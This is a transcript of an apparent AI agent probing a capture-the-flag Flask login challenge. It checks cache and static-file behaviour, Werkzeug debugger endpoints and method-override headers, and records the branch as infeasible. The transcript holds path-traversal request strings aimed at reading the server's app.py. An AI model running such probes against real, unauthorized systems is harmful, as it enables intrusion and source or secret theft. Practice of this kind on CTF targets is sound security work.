+        <link rel="stylesheet" type="text/css" href="/static/css/default.css">
+        <link rel="stylesheet" href="/static/css/materialize.min.css">
+        <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+        html {
+            display: table;
+            margin: auto;
+        }
+        body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .margin {
+          margin: 0 !important;
+        }
+        </style>
+</head>
+<body class="black">
+        <div id="login-page" class="row">
+            <div class="col s12 z-depth-6 card-panel">
+              <form class="login" action="/login" method="post" style="width:450px;">
+                <div class="row">
+                  <div class="input-field col s12 center">
+                    <p class="center login-form-text">--------SWPU-CTF WEB LOGIN--------</p>
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-social-person-outline prefix"></i>
+                    <input name="username" type="text" placeholder="Username">
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-action-lock-outline prefix"></i>
+                    <input id="password" name= "password" type="password" placeholder="Password">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12 m12 l12  login-text">
+                      <input type="checkbox" id="remember-me" />
+                      <label for="remember-me">Remember me</label>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12">
+                                <input type=submit value=submit class="btn waves-effect waves-light col s12">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s6 m6 l6">
+                    <p class="margin medium-small"><a href="/register">Register now!</a></p>
+                  </div>
+
+              </form>
+            </div>
+          </div>
+          </div>
+
+        <!--materialize js-->
+        <script src="/static/js/materialize.min.js"></script>
+</body>
+</html>
+hook: PostToolUse
+hook: PostToolUse
+ succeeded in 2ms:
+HTTP/1.1 200 OK
+Content-Length: 5690
+Accept-Ranges: bytes
+Cache-Control: max-age=60
+Connection: keep-alive
+Content-Type: text/css; charset=utf-8
+Date: Sat, 01 Aug 2026 12:30:36 GMT
+Etag: "1513186220.0-5690-2336557611"
+Expires: Sat, 01 Aug 2026 12:31:36 GMT
+Keep-Alive: timeout=4
+Last-Modified: Wed, 13 Dec 2017 17:30:20 GMT
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=663808a6-231e-4d5a-b864-18e0108c6c3c.-8S5qWPxgC540Es747WdVnYRrXc; Expires=Sat, 01-Aug-2026 14:30:36 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+X-Cache: MISS
+
+	font-family: 'icomoon';
+	src:url('../fonts/icomoon.eot?rretjt');
+	src:url('../fonts/icomoon.eot?#iefixrretjt') format('embedded-opentype'),
+		url('../fonts/icomoon.woff?rretjt') format('woff'),
+		url('../fonts/icomoon.ttf?rretjt') format('truetype'),
+		url('../fonts/icomoon.svg?rretjt#icomoon') format('svg');
+	font-weight: normal;
+	font-style: normal;
+}
+
+[class^="icon-"], [class*=" icon-"] {
+	font-family: 'icomoon';
+	speak: none;
+	font-style: normal;
+	font-weight: normal;
+	font-variant: normal;
+	text-transform: none;
+	line-height: 1;
+
+	/* Better Font Rendering =========== */
+	-webkit-font-smoothing: antialiased;
+	-moz-osx-font-smoothing: grayscale;
+}
+
+body, html { font-size: 100%; 	padding: 0; margin: 0;}
+
+/* Reset */
+*,
+*:after,
+*:before {
+	-webkit-box-sizing: border-box;
+	-moz-box-sizing: border-box;
+	box-sizing: border-box;
+}
+
+/* Clearfix hack by Nicolas Gallagher: http://nicolasgallagher.com/micro-clearfix-hack/ */
+.clearfix:before,
+.clearfix:after {
+	content: " ";
+	display: table;
+}
+
+.clearfix:after {
+	clear: both;
+}
+
+body{
+	background: #f9f7f6;
+	color: #404d5b;
+	font-weight: 500;
+	font-size: 1.05em;
+	font-family: "Microsoft YaHei","宋体","Segoe UI", "Lucida Grande", Helvetica, Arial,sans-serif, FreeSans, Arimo;
+}
+a{color: #2fa0ec;text-decoration: none;outline: none;}
+
+.htmleaf-container{
+	margin: 0 auto;
+	text-align: center;
+	overflow: hidden;
+}
+.htmleaf-content {
+	font-size: 150%;
+	padding: 1em 0;
+}
+
+.htmleaf-content h2 {
+	margin: 0 0 2em;
+	opacity: 0.1;
+}
+
+.htmleaf-content p {
+	margin: 1em 0;
+	padding: 5em 0 0 0;
+	font-size: 0.65em;
+}
+.bgcolor-1 { background: #f0efee; }
+.bgcolor-2 { background: #f9f9f9; }
+.bgcolor-3 { background: #e8e8e8; }/*light grey*/
+.bgcolor-4 { background: #2f3238; color: #fff; }/*Dark grey*/
+.bgcolor-5 { background: #df6659; color: #521e18; }/*pink1*/
+.bgcolor-6 { background: #2fa8ec; }/*sky blue*/
+.bgcolor-7 { background: #d0d6d6; }/*White tea*/
+.bgcolor-8 { background: #3d4444; color: #fff; }/*Dark grey2*/
+.bgcolor-9 { background: #ef3f52; color: #fff;}/*pink2*/
+.bgcolor-10{ background: #64448f; color: #fff;}/*Violet*/
+.bgcolor-11{ background: #3755ad; color: #fff;}/*dark blue*/
+.bgcolor-12{ background: #3498DB; color: #fff;}/*light blue*/
+/* Header */
+.htmleaf-header{
+	position: relative;
+	top: 0;
+	left: 0;
+	padding: 1em 190px 1em;
+	letter-spacing: -1px;
+	text-align: center;
+}
+.htmleaf-header h1 {
+	color: #fff;
+	font-weight: 600;
+	font-size: 2em;
+	line-height: 1;
+	margin-bottom: 0;
+	font-family: "Microsoft YaHei","宋体","Segoe UI", "Lucida Grande", Helvetica, Arial,sans-serif, FreeSans, Arimo;
+}
+.htmleaf-header h1 span {
+	font-family: "Microsoft YaHei","宋体","Segoe UI", "Lucida Grande", Helvetica, Arial,sans-serif, FreeSans, Arimo;
+	display: block;
+	font-size: 60%;
+	font-weight: 400;
+	padding: 0.8em 0 0.5em 0;
+	color: #fff;
+}
+/*nav*/
+.htmleaf-demo a{color: #1d7db1;text-decoration: none;}
+.htmleaf-demo{width: 100%;padding-bottom: 1.2em;}
+.htmleaf-demo a{display: inline-block;margin: 0.5em;padding: 0.6em 1em;border: 3px solid #1d7db1;font-weight: 700;}
+.htmleaf-demo a:hover{opacity: 0.6;}
+.htmleaf-demo a.current{background:#1d7db1;color: #fff; }
+/* Top Navigation Style */
+.htmleaf-links {
+	position: relative;
+	display: inline-block;
+	white-space: nowrap;
+	font-size: 1.5em;
+	text-align: center;
+}
+
+.htmleaf-links::after {
+	position: absolute;
+	top: 0;
+	left: 50%;
+	margin-left: -1px;
+	width: 2px;
+	height: 100%;
+	background: #dbdbdb;
+	content: '';
+	-webkit-transform: rotate3d(0,0,1,22.5deg);
+	transform: rotate3d(0,0,1,22.5deg);
+}
+
+.htmleaf-icon {
+	display: inline-block;
+	margin: 0.5em;
+	padding: 0em 0;
+	width: 1.5em;
+	text-decoration: none;
+}
+
+.htmleaf-icon span {
+	display: none;
+}
+
+.htmleaf-icon:before {
+	margin: 0 5px;
+	text-transform: none;
+	font-weight: normal;
+	font-style: normal;
+	font-variant: normal;
+	font-family: 'icomoon';
+	line-height: 1;
+	speak: none;
+	-webkit-font-smoothing: antialiased;
+}
+/* footer */
+.htmleaf-footer{width: 100%;padding-top: 10px;}
+.htmleaf-small{font-size: 0.8em;}
+.center{text-align: center;}
+/****/
+.related {
+	color: #fff;
+	background: #333;
+	text-align: center;
+	font-size: 1.25em;
+	padding: 0.5em 0;
+	overflow: hidden;
+}
+
+.related > a {
+	vertical-align: top;
+	width: calc(100% - 20px);
+	max-width: 340px;
+	display: inline-block;
+	text-align: center;
+	margin: 20px 10px;
+	padding: 25px;
+	font-family: "Microsoft YaHei","宋体","Segoe UI", "Lucida Grande", Helvetica, Arial,sans-serif, FreeSans, Arimo;
+}
+.related a {
+	display: inline-block;
+	text-align: left;
+	margin: 20px auto;
+	padding: 10px 20px;
+	opacity: 0.8;
+	-webkit-transition: opacity 0.3s;
+	transition: opacity 0.3s;
+	-webkit-backface-visibility: hidden;
+}
+
+.related a:hover,
+.related a:active {
+	opacity: 1;
+}
+
+.related a img {
+	max-width: 100%;
+	opacity: 0.8;
+	border-radius: 4px;
+}
+.related a:hover img,
+.related a:active img {
+	opacity: 1;
+}
+.related h3{font-family: "Microsoft YaHei", sans-serif;}
+.related a h3 {
+	font-weight: 300;
+	margin-top: 0.15em;
+	color: #fff;
+}
+/* icomoon */
+.icon-htmleaf-home-outline:before {
+	content: "\e5000";
+}
+
+.icon-htmleaf-arrow-forward-outline:before {
+	content: "\e5001";
+}
+
+@media screen and (max-width: 50em) {
+	.htmleaf-header {
+		padding: 3em 10% 4em;
+	}
+	.htmleaf-header h1 {
+        font-size:2em;
+    }
+}
+
+
+@media screen and (max-width: 40em) {
+	.htmleaf-header h1 {
+		font-size: 1.5em;
+	}
+}
+
+@media screen and (max-width: 30em) {
+    .htmleaf-header h1 {
+        font-size:1.2em;
+    }
+}
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'If-None-Match: \"5d56c185-515\"' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/static/css/default.css" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 304 Not Modified
+Cache-Control: max-age=60
+Connection: keep-alive
+Date: Sat, 01 Aug 2026 12:30:36 GMT
+Etag: "5d56c185-515"
+Expires: Sat, 01 Aug 2026 12:31:36 GMT
+Keep-Alive: timeout=4
+Last-Modified: Fri, 16 Aug 2019 14:45:25 GMT
+Proxy-Connection: keep-alive
+Server: openresty
+X-Cache: HIT
+
+
+hook: PostToolUse
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+ succeeded in 1004ms:
+HTTP/1.1 404 Not Found
+Content-Length: 232
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:30:37 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=7ac0d2c1-3507-41af-a319-54ae374aaad4.UN_4Fa7-smm5fTo9s_2dd7xPOAY; Expires=Sat, 01-Aug-2026 14:30:37 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+One cache distinction is worth noting: plain `/static/css/default.css` is served by openresty from a cached 1301-byte file, while the same path with a query string reaches Flask static and returns a different 5690-byte CSS asset plus a session cookie. I’m verifying whether this is only stale/static mismatch or a useful path confusion.
+exec
+/bin/bash -lc "python3 - <<'PY'
+import requests, hashlib
+base='http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com'
+paths=['/static/css/default.css','/static/css/default.css?x=1','/static/css/materialize.min.css','/static/css/materialize.min.css?x=1','/static/background.jpg','/static/background.jpg?x=1','/static/js/materialize.min.js','/static/js/materialize.min.js?x=1']
+for path in paths:
+    r=requests.get(base+path,timeout=10)
+    print('\\n',path,'status',r.status_code,'len',len(r.content),'ctype',r.headers.get('Content-Type'),'etag',r.headers.get('Etag'),'xcache',r.headers.get('X-Cache'),'setcookie',bool(r.headers.get('Set-Cookie')),'sha1',hashlib.sha1(r.content).hexdigest()[:12])
+    print(repr(r.content[:120]))
+PY" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+codex
+The static comparison is still running because one binary/static fetch is slow. I’ll let it return once, then I’ll keep any follow-up checks narrowly scoped to text headers/snippets.
+ succeeded in 21577ms:
+
+ /static/css/default.css status 200 len 1301 ctype text/css etag W/"5d56c185-515" xcache HIT setcookie False sha1 b9e8e23070f8
+b'body{\n\tfont-family: "Helvetica Neue",Helvetica,Arial,sans-serif;\n\tbackground-image: url("../background.jpg");\n\tcolor: #d'
+
+ /static/css/default.css?x=1 status 200 len 5690 ctype text/css; charset=utf-8 etag W/"1513186220.0-5690-2336557611" xcache MISS setcookie True sha1 7322511880d8
+b"\tfont-family: 'icomoon';\r\n\tsrc:url('../fonts/icomoon.eot?rretjt');\r\n\tsrc:url('../fonts/icomoon.eot?#iefixrretjt') format"
+
+ /static/css/materialize.min.css status 200 len 146430 ctype text/css; charset=utf-8 etag W/"1526548919.0-146430-3960671567" xcache MISS setcookie True sha1 1f5825d07ea0
+b'/*!\n * Materialize v0.97.1 (http://materializecss.com)\n * Copyright 2014-2015 Materialize\n * MIT License (https://raw.gi'
+
+ /static/css/materialize.min.css?x=1 status 200 len 146430 ctype text/css; charset=utf-8 etag W/"1526548919.0-146430-3960671567" xcache MISS setcookie True sha1 1f5825d07ea0
+b'/*!\n * Materialize v0.97.1 (http://materializecss.com)\n * Copyright 2014-2015 Materialize\n * MIT License (https://raw.gi'
+
+ /static/background.jpg status 200 len 908361 ctype image/jpeg etag "5d56c185-ddc49" xcache HIT setcookie False sha1 0502e9ef519b
+b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x84\x00\x0b\x0b\x0b\x0b\x0b\x0b\x0c\r\r\x0c\x11\x12\x10\x12\x11\x18\x16\x14\x14\x16\x18%\x1a\x1c\x1a\x1c\x1a%8#)##)#82<1.1<2YF>>FYgVRVg}pp}\x9d\x95\x9d\xcd\xcd\xff\x01\x0b\x0b\x0b\x0b\x0b\x0b\x0c\r\r\x0c\x11\x12\x10\x12\x11\x18\x16\x14\x14\x16\x18%\x1a\x1c\x1a\x1c\x1a%8#'
+
+ /static/background.jpg?x=1 status 404 len 232 ctype text/html etag None xcache None setcookie True sha1 8b56a18d01c0
+b'<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested'
+
+ /static/js/materialize.min.js status 200 len 122907 ctype application/javascript; charset=utf-8 etag W/"1526548919.0-122907-3510373495" xcache MISS setcookie True sha1 04f17c31243f
+b'/*!\n * Materialize v0.97.1 (http://materializecss.com)\n * Copyright 2014-2015 Materialize\n * MIT License (https://raw.gi'
+
+ /static/js/materialize.min.js?x=1 status 200 len 122907 ctype application/javascript; charset=utf-8 etag W/"1526548919.0-122907-3510373495" xcache MISS setcookie True sha1 04f17c31243f
+b'/*!\n * Materialize v0.97.1 (http://materializecss.com)\n * Copyright 2014-2015 Materialize\n * MIT License (https://raw.gi'
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+The query-string static mismatch appears to be two static roots/caches rather than a data leak. Querying static through Flask adds a session cookie and serves packaged CSS/JS; traversal attempts still return 404.
+exec
+/bin/bash -lc "python3 - <<'PY'
+import requests, re
+base='http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com'
+paths=['/static/css/default.css?x=1','/static/css/../../app.py?x=1','/static/css/%2e%2e/%2e%2e/app.py?x=1','/static/css/default.css/../../app.py?x=1','/static/css/default.css;%2f..%2f..%2fapp.py?x=1','/static/css/default.css..%2f..%2fapp.py?x=1']
+for path in paths:
+    r=requests.get(base+path, timeout=10)
+    txt=r.text if 'text' in (r.headers.get('Content-Type') or '') or 'css' in (r.headers.get('Content-Type') or '') else ''
+    hits=[k for k in ['SECRET','secret','Redis','redis','pickle','flag','FLAG','app =','Flask','password'] if k in txt]
+    print('\\n',path,'status',r.status_code,'len',len(r.content),'ctype',r.headers.get('Content-Type'),'setcookie',bool(r.headers.get('Set-Cookie')),'hits',hits)
+    print(repr(r.content[:160]))
+PY" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 2683ms:
+
+ /static/css/default.css?x=1 status 200 len 5690 ctype text/css; charset=utf-8 setcookie True hits []
+b"\tfont-family: 'icomoon';\r\n\tsrc:url('../fonts/icomoon.eot?rretjt');\r\n\tsrc:url('../fonts/icomoon.eot?#iefixrretjt') format('embedded-opentype'),\r\n\t\turl('../fonts/"
+
+ /static/css/../../app.py?x=1 status 404 len 232 ctype text/html setcookie True hits []
+b'<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you'
+
+ /static/css/%2e%2e/%2e%2e/app.py?x=1 status 404 len 232 ctype text/html setcookie True hits []
+b'<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you'
+
+ /static/css/default.css/../../app.py?x=1 status 404 len 232 ctype text/html setcookie True hits []
+b'<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you'
+
+ /static/css/default.css;%2f..%2f..%2fapp.py?x=1 status 404 len 232 ctype text/html setcookie True hits []
+b'<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you'
+
+ /static/css/default.css..%2f..%2fapp.py?x=1 status 404 len 232 ctype text/html setcookie True hits []
+b'<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you'
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+I found no sensitive keywords or source content in the Flask-served static assets. One remaining cache-specific question is whether static query responses cache `Set-Cookie`; if they do, that could create session fixation/leakage, so I’m testing repeatability.
+exec
+/bin/bash -lc "python3 - <<'PY'
+import requests, time
+base='http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com'
+path='/static/css/materialize.min.css?branch_cache_repeat='+str(int(time.time()*1000)%1000000)
+for i in range(3):
+    r=requests.get(base+path,timeout=10)
+    print(i,'status',r.status_code,'xcache',r.headers.get('X-Cache'),'cache-control',r.headers.get('Cache-Control'),'set-cookie',r.headers.get('Set-Cookie'))
+PY" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 1377ms:
+0 status 200 xcache MISS cache-control max-age=60 set-cookie session=37cdcb5c-b727-4cb2-9a83-65ff5453d003.kXSVIWFhFIsgP0Vfw3Es1d81XBY; Expires=Sat, 01-Aug-2026 14:31:56 GMT; HttpOnly; Path=/
+1 status 200 xcache MISS cache-control max-age=60 set-cookie session=255f60e3-4aa3-477b-a363-94d286b635da.1VyOGAJiMoDqhJ3F1IaE2cHIG54; Expires=Sat, 01-Aug-2026 14:31:57 GMT; HttpOnly; Path=/
+2 status 200 xcache MISS cache-control max-age=60 set-cookie session=dc30c432-d90b-48df-b134-35dff16859ad.7vgeGJZtKMtcB2HWS7nnnlr4xH8; Expires=Sat, 01-Aug-2026 14:31:57 GMT; HttpOnly; Path=/
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Static query responses are not actually being cached by openresty (`X-Cache: MISS` every time), so there is no shared `Set-Cookie` fixation/leak there. I’m checking for Werkzeug debugger/resource exposure and then I’ll write the branch result.
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 'http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/?__debugger__=yes&cmd=resource&f=style.css'" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:32:22 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=1a596c84-4680-416d-8ef5-305eba6282ea.E0_fKeZ9mACZBkjla5pTcO46LrA; Expires=Sat, 01-Aug-2026 14:32:22 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!doctype html>
+<html lang="zh">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deserialization Login</title>
+        <link rel="stylesheet" type="text/css" href="/static/css/default.css">
+        <link rel="stylesheet" href="/static/css/materialize.min.css">
+        <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+        html {
+            display: table;
+            margin: auto;
+        }
+        body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .margin {
+          margin: 0 !important;
+        }
+        </style>
+</head>
+<body class="black">
+        <div id="login-page" class="row">
+            <div class="col s12 z-depth-6 card-panel">
+              <form class="login" action="/login" method="post" style="width:450px;">
+                <div class="row">
+                  <div class="input-field col s12 center">
+                    <p class="center login-form-text">--------SWPU-CTF WEB LOGIN--------</p>
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-social-person-outline prefix"></i>
+                    <input name="username" type="text" placeholder="Username">
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-action-lock-outline prefix"></i>
+                    <input id="password" name= "password" type="password" placeholder="Password">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12 m12 l12  login-text">
+                      <input type="checkbox" id="remember-me" />
+                      <label for="remember-me">Remember me</label>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12">
+                                <input type=submit value=submit class="btn waves-effect waves-light col s12">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s6 m6 l6">
+                    <p class="margin medium-small"><a href="/register">Register now!</a></p>
+                  </div>
+
+              </form>
+            </div>
+          </div>
+          </div>
+
+        <!--materialize js-->
+        <script src="/static/js/materialize.min.js"></script>
+</body>
+</html>
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -X POST -H 'X-HTTP-Method-Override: GET' -d 'username=override&password=p' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+hook: PostToolUse
+ succeeded in 0ms:
+HTTP/1.1 302 Found
+Content-Length: 209
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:32:22 GMT
+Keep-Alive: timeout=4
+Location: http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=93004dce-a96c-47a3-a8b4-de78fde23cb7.7YF0CnBX_Rdexjvj44VTNpMirGo; Expires=Sat, 01-Aug-2026 14:32:22 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.
+hook: PostToolUse
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 'http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/login?__debugger__=yes&cmd=resource&f=console.png'" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -X GET -H 'X-HTTP-Method-Override: POST' -d 'username=override2&password=p' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 200 OK
+Content-Length: 2067
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:32:22 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=32e39194-a59e-4b43-805f-03a16cb8277e.Cas8dJBoeAC04klfo0zqGUAeWk4; Expires=Sat, 01-Aug-2026 14:32:22 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+	<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<title>Deserialization Register</title>
+	<link rel="stylesheet" type="text/css" href="/static/css/default.css">
+	<link rel="stylesheet" href="/static/css/materialize.min.css">
+	<style type="text/css">
+	html,
+	body {
+	height: 100%;
+	}
+	html {
+	display: table;
+	margin: auto;
+	}
+	body {
+	display: table-cell;
+	vertical-align: middle;
+	}
+	.margin {
+	margin: 0 !important;
+	}
+	</style>
+	<!--[if IE]>
+      <script src="http://libs.useso.com/js/html5shiv/3.7/html5shiv.min.js"></script>
+    <![endif]-->
+</head>
+
+<body class="white">
+	<div id="login-page" class="row">
+		<div class="col s12 z-depth-6 card-panel">
+			<form class="login-form" action="/register" method="POST" style="width:400px;">
+				<div class="row">
+					<div class="input-field col s12 center">
+						<p class="center login-form-text">
+							--------SWPU-CTF WEB Register--------
+						</p>
+					</div>
+				</div>
+				<div class="row margin">
+					<div class="input-field col s12">
+						<i class="mdi-social-person-outline prefix"></i>
+						<input id="username" name="username" type="text" class="validate" placeholder="Username" />
+					</div>
+				</div>
+				<div class="row margin">
+					<div class="input-field col s12">
+						<i class="mdi-action-lock-outline prefix"></i>
+						<input id="password" name="password" type="password" class="validate" placeholder="Password" />
+					</div>
+				</div>
+				<div class="row">
+					<div class="input-field col s12">
+						<input type="submit" value="Register" class="btn waves-effect waves-light col s12" />
+					</div>
+					<div class="input-field col s12">
+						<p class="margin center medium-small sign-up">
+							Already have account? <a href="/login">Login</a>
+						</p>
+					</div>
+				</div>
+			</form>
+		</div>
+	</div>
+	<script src="/static/js/materialize.min.js"></script>
+</body>
+
+</html>
+hook: PostToolUse
+hook: PostToolUse Completed
+ succeeded in 2168ms:
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:32:24 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=0bf30cd2-fc01-4730-b614-d967e1d35505.e58JfXUF6UcXwqDC1IBfLvAt3Mo; Expires=Sat, 01-Aug-2026 14:32:24 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!doctype html>
+<html lang="zh">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deserialization Login</title>
+        <link rel="stylesheet" type="text/css" href="/static/css/default.css">
+        <link rel="stylesheet" href="/static/css/materialize.min.css">
+        <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+        html {
+            display: table;
+            margin: auto;
+        }
+        body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .margin {
+          margin: 0 !important;
+        }
+        </style>
+</head>
+<body class="black">
+        <div id="login-page" class="row">
+            <div class="col s12 z-depth-6 card-panel">
+              <form class="login" action="/login" method="post" style="width:450px;">
+                <div class="row">
+                  <div class="input-field col s12 center">
+                    <p class="center login-form-text">--------SWPU-CTF WEB LOGIN--------</p>
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-social-person-outline prefix"></i>
+                    <input name="username" type="text" placeholder="Username">
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-action-lock-outline prefix"></i>
+                    <input id="password" name= "password" type="password" placeholder="Password">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12 m12 l12  login-text">
+                      <input type="checkbox" id="remember-me" />
+                      <label for="remember-me">Remember me</label>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12">
+                                <input type=submit value=submit class="btn waves-effect waves-light col s12">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s6 m6 l6">
+                    <p class="margin medium-small"><a href="/register">Register now!</a></p>
+                  </div>
+
+              </form>
+            </div>
+          </div>
+          </div>
+
+        <!--materialize js-->
+        <script src="/static/js/materialize.min.js"></script>
+</body>
+</html>
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Debugger resource probes returned normal app pages, and method-override headers are ignored. I have enough evidence for this branch: no concrete HTTP-side Redis/session/source/secret primitive found, so I’ll write an INFEASIBLE result file with the useful observations.
+exec
+/bin/bash -lc 'test -e branch_result_branch_003.md && printf exists || printf missing' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+missing
+hook: PostToolUse
+hook: PostToolUse Completed
+apply patch
+patch: completed
+/home/stw/ctf-agent/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md
+diff --git a/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md b/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md
+new file mode 100644
+index 0000000000000000000000000000000000000000..2c41e1180dc420e6fc2d4c3c40ed11712b2a747c
+--- /dev/null
++++ b/challenges/manual_web_fafdc5730dee/branch_result_branch_003.md
+@@ -0,0 +1,32 @@
++## Branch Result
++direction: http-edge-write-leaks
++subagent_id: branch_003
++status: INFEASIBLE
++### 发现
++- 基础页面行为：`/`、`/login` 均返回登录页并设置 `session=<uuid>.<sig>`；正常注册/登录后 cookie UUID 不变，`/` 反射 `Welcome,<username>`，HTML 注释仅提示 `Red*s`。
++- 方法边界：`OPTIONS /login` 显示 `HEAD, GET, POST, OPTIONS`；`TRACE` 被 openresty 拦截为 405；`PUT` 到 Flask 405；`X-HTTP-Method-Override` 不生效。
